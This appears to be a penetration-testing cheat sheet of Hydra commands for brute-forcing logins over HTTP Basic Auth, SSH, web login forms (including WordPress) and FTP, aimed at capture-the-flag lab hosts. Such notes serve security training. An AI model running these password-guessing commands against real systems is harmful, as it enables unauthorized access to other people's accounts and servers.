# Hydra

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use -C for user:pass in one file
```

### SSH

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.165.242
```

### POST

{% code overflow="wrap" %}
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.89.16 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"


hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.11.47 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```
{% endcode %}

### FTP

```bash
hydra -l ftpuser -P passwords.txt 10.10.231.155 ftp
```
